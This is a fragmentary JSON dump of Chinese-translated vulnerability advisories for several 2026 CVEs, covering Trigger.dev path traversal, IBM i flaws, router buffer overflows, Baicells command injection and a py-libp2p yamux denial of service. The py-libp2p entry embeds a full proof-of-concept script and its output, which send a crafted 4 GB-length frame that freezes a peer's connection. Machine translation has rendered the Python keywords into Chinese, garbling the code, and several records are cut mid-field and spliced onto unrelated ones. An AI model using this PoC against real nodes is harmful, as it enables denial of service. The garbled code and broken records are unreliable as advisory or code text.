"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N", "severity": "high", "base_score": 8.2}]}, "cvss_score": 8.2, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N", "cwe": "CWE-862", "description": "Trigger.dev 是一个用于构建和部署完全托管的 AI 代理和工作流程的平台。从 4.4.2 到 4.5.0-rc.5，apps/webapp/app/v3/objectStoreClient.server.ts 中的 Aws4FetchClient.buildUrl() 和 Aws4FetchClient.presign() 将用户控制的数据包密钥分配给 URL.pathname，而 apps/webapp/app/routes/api.v1.packets.$.ts 接受 params[\"*\"] 而不拒绝点段并使用findResource: async () =\u003e 1 没有每个资源所有权验证。 WHATWG 路径规范化在签名之前折叠 .. 段，允许具有有效环境 API 密钥的调用者获取另一个租户的对象存储密钥的预签名 URL，并读取或覆盖任务负载。此问题已在版本 4.5.0-rc.5 中修复。", "effects": [], "epss": -1, "exp": false "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-73659", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "severity": "high", "base_score": 8.1}]}, "cvss_score": 8.1, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "cwe": "CWE-22", "description": "Trigger.dev 是用于在 TypeScript 中构建 AI 工作流程的开源平台。从4.4.2到4.5.0，apps/webapp/app/routes/api.v1.packets.$.ts中的数据包预签名路由通过resolveStoreProtocolForPacketPresign传递调用者控制的文件名到apps/webapp/app/v3/objectStore.server.ts中的generatePresignedUrl和generatePresignedRequest，允许..遍历转义packets/\u003cprojectRef\u003e/\u003cenv\u003e/ object-store前缀并启用项目 API 密钥来读取或覆盖另一个组织的卸载任务负载和多组织自托管实例上的输出。此问题已在 4.5.0 版本中修复。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-s5oi-wxl9", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9", "name": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73659", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73659"}, {"url": "https://github.com/triggerdotdev/trigger.dev/commit/db4074df54db06b0656becf3f974345c90fa202e", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/pull/3830", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.5.0", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-m3mf-37q7-8928", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73659漏洞", "_translated": true, "_saved_at": "2026-08-13T23:35:23+00:00", "_first_saved_at": "2026-08-13T23:35:23+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-s5oi-wxl9"}, {"analysis_status": 0, "articles": [{"content": "应用程序在权限管理方面存在缺陷，未能正确地验证和限制用户的权限。这可能包括访问控制列表（ACL）的不当配置、权限检查的缺失或错误、不恰当的身份验证和授权过程等。攻击者可以利用这些缺陷来绕过访问控制，获得未经授权的权限，执行敏感操作或访问敏感信息。", "title": "什么是权限管理不当"}, {"content": "- 水平权限提升：攻击者以与当前授权相同的权限冒充其他用户，获取对其他用户的访问权限。这可能是由于应用程序未能适当验证和限制用户的身份验证和授权。\r\n- 垂直权限提升：攻击者以比其当前授权更高的权限执行操作，获取对更高权限资源的访问。这可以发生在应用程序未正确验证用户请求的权限级别，或者在权限检查过程中存在漏洞的情况下。\r\n- 特权维持：攻击者通过利用特权管理的不当实施，将其特权保持在系统中。这可以包括未及时撤销特权、未正确管理特权的生命周期等。", "title": "权限管理不当常见的攻击方式"}, {"content": "- 适当的访问控制：应用程序应该实施适当的访问控制机制，包括强制访问控制列表（ACL）、角色基础访问控制（RBAC）、最小权限原则等，以确保用户只能访问其授权范围内的资源。\r\n- 身份验证和授权的正确实施：应用程序应该正确实施身份验证和授权机制，包括验证用户的身份、验证请求的权限级别，以及在授权过程中进行必要的权限检查。\r\n- 权限分离原则：应用程序应该根据职责和功能将特权分离，并只授予用户所需的最低权限，遵循最小特权原则。\r\n- 审计和监控：应用程序应该记录和监控特权操作，及时检测和响应异常或未经授权的特权访问。\r\n- 安全编码实践：开发人员应遵循安全编码实践，如输入验证、输出编码、错误处理等，以防止特权管理不当的漏洞。", "title": "如何预防权限管理不当"}], "cnvd_id": "", "cve_id": "CVE-2026-18071", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-269", "description": "IBM i 7.6、7.5、7.4 和 7.3 可能允许本地攻击者因权限管理不当而获得提升的权限。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-4zlo-kw9q", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-4zlo-kw9q", "name": "https://www.oscs1024.com/hd/MPS-4zlo-kw9q"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-18071", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-18071"}, {"url": "https://www.ibm.com/support/pages/node/7283579", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-18071漏洞", "_translated": true, "_saved_at": "2026-08-13T20:36:06+00:00", "_first_saved_at": "2026-08-13T20:36:06+00:00", "_source_page": "https://www.  0, "articles": [{"content": "应用程序未能有效地控制资源的使用，导致攻击者可以利用这个漏洞耗尽应用程序所依赖的资源。这些资源可以是计算资源（CPU、内存）、网络带宽、数据库连接或其他系统资源。攻击者可以通过发送特制的请求、恶意输入或其他方式，使应用程序消耗大量资源，导致拒绝服务或系统崩溃。", "title": "什么是拒绝服务"}, {"content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。", "title": "拒绝服务常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 压力测试与性能优化：应用程序应该进行压力测试，以评估其在高负载情况下的性能，并进行必要的性能优化，以确保能够有效地处理大量请求而不耗尽资源。", "title": "如何预防拒绝服务"}], "cnvd_id": "", "cve_id": "CVE-2026-73568", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "cwe": "CWE-400", "description": "### 总结\npy-libp2p 中的 yamux 流多路复用器在读取帧主体之前不会根据接收窗口验证传入的 DATA 帧长度。任何完成标准 libp2p 握手的对等方都可以发送一个 12 字节帧，声明 4 GB 主体，导致受害者的 yamux 读取循环无限期阻塞。这会影响默认的“new_host()”配置，并且不需要双方进行特殊设置。\n\n### 详细信息\n在“libp2p/stream_muxer/yamux/yamux.py”（第 915 行到 926 行）中，“handle_incoming()”方法按帧类型进行调度。当数据帧到达时，它无条件读取主体：\n\n````蟒蛇\nelif 类型 == TYPE_DATA：\n    尝试：\n        数据 = (\n            等待 read_exactly(self.secured_conn, 长度)\n            如果长度 \u003e 0\n            否则b””\n        ）\n````\n\n“length”字段直接取自有线解码帧头，是一个 32 位无符号整数，最大值为 4,294,967,295。不检查“length”是否适合流的接收窗口（“DEFAULT_WINDOW_SIZE = 256 * 1024”字节）。正文读取也会发生在代码检查引用的“stream_id”是否存在于“self.streams”中之前（该检查位于第 954 行），因此任何流 ID 都会触发该问题。\n\n`handle_incoming()` 本身是一个单一的顺序循环，在主体读取周围没有超时。一旦“read_exactly”暂停等待永远不会到来的数据，循环就无法处理任何后续帧。该 yamux 连接上的每个流都会停止工作，并且不会引发异常。\n\n相同的不受保护的调用出现在第 804 至 806 行的 SYN 分支中，因此具有大长度字段的精心设计的 SYN 帧会触发相同的停顿。\n\nyamux 规范（第 3.3 节）明确要求如果发送方传输的数据多于接收窗口允许的数据，则接收方重置流。 py-libp2p 不会在接收端强制执行此操作。所有三个类似的实现都是这样做的： go-yamux 跟踪每个流的“recvWindow”并在违反时返回“SendWindowExceeded”错误； rust-yamux 根据流信用验证帧长度； js-libp2p yamux 根据“maxMessageSize”检查帧长度。\n\n### 概念验证\n该工具完成两个本地主机之间的正常噪声握手和 yamux 协商，通过攻击前 ping 确认 yamux 运行状况良好，然后将单个恶意帧直接写入攻击者的安全连接。短暂暂停后，它会尝试打开一个新的流，截止时间为 3 秒。打开的流永远不会完成。\n\n文件：test_poc.py\n\n````蟒蛇\n”“”\n作者：@tahaafarooq\nPOC：通过超大数据帧进行 yamux 连接 DoS（连接 DoS）\n”“”\n导入操作系统\n导入秘密\n导入气相色谱\n导入结构体\n\n导入 psutil\n进口三重奏\n导入多地址\n\n从 libp2p 导入 new_host\n从 libp2p.crypto.ed25519 导入 create_new_key_pair\n从 libp2p.custom_types 导入 TProtocol\n从 libp2p.peer.peerinfo 导入 PeerInfo\n从 libp2p.stream_muxer.yamux.yamux 导入 Yamux\n\nLOOPBACK = multiaddr.Multiaddr(\"/ip4/127.0.0.1/tcp/0\")\nPING = TProtocol(\"/audit/ping/1.0.0\")\n\nYAMUX_HEADER_FORMAT = \"!BBHII\"\n类型数据 = 0x0\nHUGE_LENGTH = 0xFFFF_FFFF # 最大 uint32 — 4,294,967,295 字节\n\n\ndef craft_malicious_frame(stream_id: int = 1) -\u003e 字节：\n    ”“”\n    12 字节 yamux 数据帧，标志 = 0，长度 = 4 GB。\n    Stream_id 不相关：yamux 在检查之前读取正文\n    流是否存在。\n    ”“”\n    返回struct.pack（YAMUX_HEADER_FORMAT，0，TYPE_DATA，0，stream_id，HUGE_LENGTH）\n\n\ndef _get_yamux(主机，peer_id) -\u003e Yamux |无：\n    swarm = 主机.get_network()\n    conns = swarm.connections.get(peer_id)\n    如果 conns 为 None：\n        返回无\n    conn = conns[0] if isinstance(conns, 列表) else conns\n    mc = conn.muxed_conn\n    如果 isinstance(mc, Yamux) 返回 mc 否则无\n\n\n异步防御攻击()：\n    proc = psutil.Process(os.getpid())\n    rss0 = proc.memory_info().rss\n\n    v_kp = create_new_key_pair(secrets.token_bytes(32))\n    a_kp = create_new_key_pair(secrets.token_bytes(32))\n\n    # 默认 new_host() — 噪声 + yamux — 没有显式的 sec_opt 或 muxer_opt\n    受害者 = new_host(key_pair=v_kp)\n    攻击者 = new_host(key_pair=a_kp)\n\n    victim.set_stream_handler(PING, lambda s: s.close())与victim.run异步（listen_addrs = [LOOPBACK]）：\n        vaddr = 受害者.get_addrs()[0]\n        在 str(vaddr) 中断言“127.0.0.1”，“安全：非环回”\n        print(f\"[*] 受害者：{vaddr}\")\n        print(f\"[*] 配置：默认（噪声 + yamux）\")\n\n        与 Attacker.run 异步（listen_addrs=[LOOPBACK]）：\n            等待攻击者.connect(PeerInfo(victim.get_id(),victim.get_addrs()))\n            等待 trio.sleep(0.2)\n\n            a_yamux = _get_yamux(攻击者, 受害者.get_id())\n            v_yamux = _get_yamux(受害者, 攻击者.get_id())\n            断言 a_yamux 和 v_yamux，“未找到 yamux muxed_conn”\n            打印（\n                f\"[*] Muxer : 攻击者={type(a_yamux).__name__}, \"\n                f“受害者= {类型（v_yamux）.__name__}”\n            ）\n\n            # --- 预攻击：确认 yamux 健康 ---\n            pre_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n            等待 pre_stream.close()\n            print(\"[*] 攻击前 ping: OK (yamux live)\")\n\n            # --- 注入恶意框架 ---\n            框架 = craft_malicious_frame(stream_id=1)\n            打印（\n                f\"[*] 注入 {len(frame)} 字节 yamux 帧：\"\n                f“类型=数据标志=0x0stream_id=1长度={HUGE_LENGTH：#010x}”\n                f\"({HUGE_LENGTH:,} 字节)\"\n            ）\n            print(f\"[*] 十六进制帧: {frame.hex()}\")\n\n            # 直接写入噪声加密的安全连接。\n            # secure_conn.write() 在发送前加密；受害者解密并\n            # 查看handle_incoming 处理的原始 yamux 帧字节。\n            等待 a_yamux.secured_conn.write(frame)\n            等待 trio.sleep(0.2)\n            # 受害者的handle_incoming现在已经读取了12字节的标头，并已发送\n            # 到 `eliftyp == TYPE_DATA:`，并输入 read_exactly(conn, 4GB)。\n\n            # --- 攻击后：尝试使用 yamux ---\n            post_attack_succeeded = False\n\n            与 trio.move_on_after(3.0) 一起：\n                尝试：\n                    post_stream = 等待攻击者.new_stream(victim.get_id(), [PING])\n                    等待 post_stream.close()\n                    post_attack_succeeded = True\n                除了异常 e：\n                    print(f\"[*] 攻击后 new_stream 错误: {type(e).__name__}: {e}\")\n\n            GC.collect()\n            rss1 = proc.memory_info().rss\n\n            打印（“\\n===结果===”）\n            print(f\"注入的帧（十六进制）：{frame.hex()}\")\n            打印（\n                f“正文长度字段：请求 {HUGE_LENGTH} 字节，发送 0 字节”\n            ）\n            print(f\"攻击后 ping 正常：{post_attack_succeeded}\")\n            print(f\"RSS 增量：{(rss1 - rss0) / 1024:.1f} KiB\")\n\n            yamux_stuck = 未 post_attack_succeeded\n            print(f\"\\n受害者 yamux 循环卡住：{yamux_stuck}\")\n\n            如果 yamux_stuck：\n                打印（\n                    “[已确认] handle_incoming 被阻止 - 受害者 yamux 因“而死亡”\n                    “这个联系。”\n                ）\n                打印（\n                    “[影响]来自任何经过身份验证的对等方的单个 12 字节写入”\n                    “（噪声握手后）\\n”\n                    \" 永久停止该连接的 yamux。\\n\"\n                    “影响默认 new_host() 配置 - 不需要 mplex。\\n”\n                    “没有超时，没有最大长度检查，没有例外。”\n                ）\n            其他：\n                print(\"[未确认] yamux 在攻击后做出了响应。\")\n\n            断言 yamux_stuck, (\n                “预计 yamux 在注入恶意 DATA 帧后会被卡住，”\n                “但连接仍然有效。”\n            ）\n\n\ndef test_yamux_data_frame_stall():\n    三人组奔跑（攻击）\n\n\n如果 __name__ == \"__main__\":\n    三人组奔跑（攻击）\n````\n\n````\npython3 -m pytest test_poc.py::test_yamux_data_frame_stall -v\n````\n\n恶意帧（12字节，十六进制）：`00000000000000 01ffffffff`\n\n````\n版本=0x00\n类型 = 0x00（数据）\n标志= 0x0000\n流_id = 0x00000001\n长度 = 0xFFFFFFFF（4,294,967,295 字节）\n````\n\n输出：\n\n````\n[*] 配置：默认（噪音 + yamux）[*] 攻击前 ping：好的（yamux live）\n[*] 注入 12 字节 yamux 帧： type=DATA flags=0x0 stream_id=1 length=0xffffffff\n受害者 yamux 循环卡住：True\n[已确认] handle_incoming 被阻止 - 受害者 yamux 因该连接而死亡。\n约 3.8 秒内通过\n````\n\n### 影响\n单个经过身份验证的对等点（已完成噪声握手，无需凭据）可以使用 12 字节的有效负载永久冻结给定连接的 yamux 读取循环。该连接上的所有流都停止工作。不会引发异常，不会写入日志条目，也不会发生自动恢复。\n\n这适用于默认的“new_host()”配置。与 mplex 复用器中的类似问题（需要显式选择加入）不同，使用标准设置的每个 py-libp2p 节点都会受到影响。在 10,000 个连接的默认连接限制下，运行 10,000 个对等点的攻击者可以使用大约 120 KB 的总流量冻结所有连接。\n\n不存在机密性或完整性影响。影响仅限于目标 yamux 连接上的可用性。\n\n### 补救措施\n\n**1.对入站数据帧强制执行接收窗口**（主要修复）\n在调用“read_exactly”之前，拒绝声明长度超过协商接收窗口的帧：\n\n````蟒蛇      \n# libp2p/stream_muxer/yamux/yamux.py\n  "https://www.oscs1024.com/hd/MPS-2fvl-jh41"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19812", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19812"}, {"url": "https://github.com/panda666-888/vuls/blob/main/totolink/a800r/UploadCustomModule.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19812", "name": ""}, {"url": "https://vuldb.com/submit/869428", "name": ""}, {"url": "https://vuldb.com/vuln/389948", "name": ""}, {"url": "https://vuldb.com/vuln/389948/cti", "name": ""}, {"url": "https://www.totolink.net/", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19812漏洞", "_translated": true, "_saved_at": "2026-08-14T10:53:23+00:00", "_first_saved_at": "2026-08-14T09:54:43+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-2fvl-jh41"}, {"analysis_status": 0, "articles": [{"content": "应用程序在进行身份验证时使用了不恰当的机制或实施不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-73655", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", "severity": "high", "base_score": 7.4}]}, "cvss_score": 7.4, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", "cwe": "CWE-287" 计和监控：定期对系统和应用程序进行安全审计和监控，及时发现和阻止潜在的安全漏洞和攻击，确保系统和数据的安全和可靠性。", "title": "如何预防经典缓冲区溢出"}], "cnvd_id": "", "cve_id": "CVE-2026-19792", "cvss": {"cvssv2": [{"source": "cna@vuldb.com", "vector": "AV:N/AC:L/Au:S/C:C/I:C/A:C", "severity": "high", "base_score": 9}], "cvssv31": [{"source": "cna@vuldb.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}], "cvssv4": [{"source": "cna@vuldb.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.4}]}, "cvss_score": 7.4, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-120", "description": "Tenda G0被发现存在安全漏洞，安全漏洞编号为20260625，受影响的是组件httpd Web管理界面的/goform/module文件中的setPortMapping函数。对参数 portMappingServer/porMappingtInternal/portMappingExternal 进行操作会导致缓冲区溢出。攻击可以远程进行。该漏洞已向公众发布，可用于攻击。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "经典缓冲区溢出", "kind_en": "不检查输入大小的缓冲区复制（“经典缓冲区溢出”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-svy5-mu0r", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-svy5-mu0r", "name": "https://www.oscs1024.com/hd/MPS-svy5-mu0r"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19792", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19792"}, {"url": "https://github.com/lipenghai/iot_bug/blob/main/Tenda/G0/3.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19792", "name": ""}, {"url": "https://vuldb.com/submit/868929", "name": ""}, {"url": "https://vuldb.com/vuln/389758", "name": ""}, {"url": "https://vuldb.com/vuln/389758/cti talRules.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19815", "name": ""}, {"url": "https://vuldb.com/submit/869442", "name": ""}, {"url": "https://vuldb.com/vuln/389951", "name": ""}, {"url": "https://vuldb.com/vuln/389951/cti", "name": ""}, {"url": "https://www.totolink.net/", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19815漏洞", "_translated": true, "_saved_at": "2026-08-14T10:53:18+00:00", "_first_saved_at": "2026-08-14T09:54:28+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-zbhr-8q9u"}, {"analysis_status": 0, "articles": [{"content": "在程序没有正确验证和限制内存写操作的情况下，攻击者通过向应用程序提供恶意输入，成功地将数据写入超出其预期范围的内存位置。这可能导致程序的内存损坏，使攻击者能够执行任意代码或破坏应用程序的正常运行。", "title": "什么是越界写入"}, {"content": "- 缓冲区溢出：攻击者向应用程序的输入缓冲区中输入超出其容量的数据，导致数据溢出到相邻的内存区域，从而修改重要的数据结构或执行恶意代码。\n- 栈溢出：攻击者通过向函数调用栈中注入超出其容量的数据，覆盖返回地址或重要的控制信息，控制程序的执行流程。\n- 格式化字符串漏洞：攻击者利用格式化字符串函数的漏洞，通过提供恶意格式字符串来修改内存内容，进而执行任意代码。", "title": "越界写入常见的攻击方式"}, {"content": "- 输入验证和过滤：对于所有用户输入的数据，进行严格的验证和过滤，确保只接受合法的输入数据。\n- 使用安全的内存操作函数：使用安全的内存操作函数，如安全的字符串拷贝函数（如strcpy_s、strncpy_s）和安全的格式化函数（如snprintf、sprintf_s），确保内存操作的安全性。\n- 边界检查：在进行内存写操作时，确保操作不会超出内存的边界，可以使用边界检查函数或标准库提供的安全函数来实现。\n- 内存保护机制：启用操作系统或编译器提供的内存保护机制，如地址空间布局随机化（ASLR）、数据执行保护（DEP）等，以增加攻击的难度。\n- 定期更新和修复：及时应用厂商发布的安全补丁和更新，修复已知的跨界内存写漏洞。", "title": "如何预防越界写入"}], "cnvd_id": "", "cve_id": "CVE-2026-18511", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "severity": "high", "base_score": 7.3}]}, "cvss_score": 7.3, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "cwe": "CWE-787", "description": "IBM i 7.6、7.5、7.4 和 7.3 可能允许本地经过身份验证的攻击者在本机 IBM i JSSE 提供程序中生成基于堆栈的缓冲区溢出，这是由 TLS 会话建立期间不正确的边界检查引起的。本地攻击者可能会溢出固定长度缓冲区并在系统上执行任意代码或导致 JVM 进程崩溃。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "越界写入", "kind_en": "越界写入", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-398f-1xtn", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-398f-1xtn", "name": "https://www.oscs1024.com/hd/MPS-398f-1xtn"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-18511", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-18511"}, {"url": "https://www.ibm.com/support/pages/node/7283285", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-18511漏洞", "_translated": true, "_saved_at": "2026-08-13T22:34:56+00:00", "_first_saved_at": "2026-08-13T22:34:56+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-398f-1xtn"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能正确验证和过滤用户输入，将用户提供的数据直接用作操作系统命令的一部分。攻击者可以利用这个漏洞，通过注入恶意的操作系统命令来执行任意系统命令、获取敏感信息或者对系统进行未授权的操作。", "title": "什么是OS命令注入"}, {"content": "- 命令拼接：应用程序将用户输入直接拼接到操作系统命令中，而不进行合适的过滤和验证。攻击者可以通过在输入中注入特殊字符、命令分隔符等，来执行额外的命令或修改原始命令的行为。\r\n- 命令注释：攻击者通过在输入中注入特殊字符或命令注释符号，如\"#\"或\"//\"，来注释掉原始命令中的一部分，然后执行自己的恶意命令。\r\n- 命令管道：攻击者通过在输入中注入管道符号\"|\"，将多个命令连接起来执行。这使得攻击者可以在单个注入点上执行多个命令，进一步扩大攻击的范围。", "title": "OS命令注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对用户输入进行严格的验证和过滤，确保只接受预期的有效输入。可以使用白名单验证，限制用户输入的字符集和格式，防止特殊字符和命令注释符的注入。\r\n- 使用参数化命令或预编译语句：应该使用参数化命令或预编译语句，而不是将用户输入直接拼接到命令中。这样可以将输入数据视为参数，而不是命令的一部分，从而避免命令注入漏洞。\r\n- 最小特权原则：应用程序在执行操作系统命令时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。这样即使发生命令注入漏洞，攻击者的权限也会受到限制。\r\n- 安全编码实践：开发人员应避免使用不受信任的用户输入来拼接命令，并使用安全的编码实践，如输入验证、输出编码和参数化查询等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止命令注入攻击。", "title": "如何预防OS命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-19771", "cvss": {"cvssv2": [{"source": "cna@vuldb.com", "vector": "AV:N/AC:L/Au:M/C:C/I:C/A:C", "severity": "high", "base_score": 8.3}], "cvssv31": [{"source": "cna@vuldb.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.2}], "cvssv4": [{"source": "cna@vuldb.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.3}]}, "cvss_score": 7.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-78", "description": "Baicells EG3661M BaiCE_BQ6_2.0.5.3_NA 中发现了一个漏洞。这会影响 LuCI Web 界面组件的文件 /cgi-bin/luci 的未知功能。对 MaxHops/Timeout/Size 参数的这种操作会导致操作系统命令注入。攻击可能是远程发起的。该漏洞是公开可用的并且可能会被使用。我们很早就就此事联系了供应商，但没有以任何方式做出回应。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", 